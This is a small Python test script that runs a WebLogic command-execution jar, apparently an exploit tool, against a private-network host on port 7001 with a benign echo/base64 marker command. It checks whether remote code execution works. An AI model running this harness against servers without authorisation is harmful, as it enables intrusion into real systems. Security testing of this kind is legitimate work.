#!/usr/bin/python3.8
# -*- coding: utf-8 -*-
# @Time    : 2020/10/11 8:20 下午
# @Author  : rocky
# @Email   : 939555035@qq.com
# @File    : test3.py
# @Software: PyCharm

# import subprocess
#
# res = subprocess.call(['java', '-jar', '../jarpackage/weblogic_cmd.jar', '-H', '192.168.50.122', '-P', '7001', '-C',
#                        'echo UjFhbmRyMG9wCg== | base64'])
# print(res)

# import inspect
#
# current_file_name = inspect.getfile(inspect.currentframe())
# print(f"current_file_name: {current_file_name}")

from subprocess import *


host = '192.168.50.122'

p = Popen(
    ['java', '-jar', '../jarpackage/weblogic_cmd.jar', '-H', '192.168.50.122', '-P',
     '7001', '-C', 'echo UjFhbmRyMG9wCg== | base64'],stdin=PIPE,stdout=PIPE,)



# p = Popen(['ping', '-c5', host],
#           stdin=PIPE,
#           stdout=PIPE,
#           )
p.wait()
out = p.stdout.read()

print(out)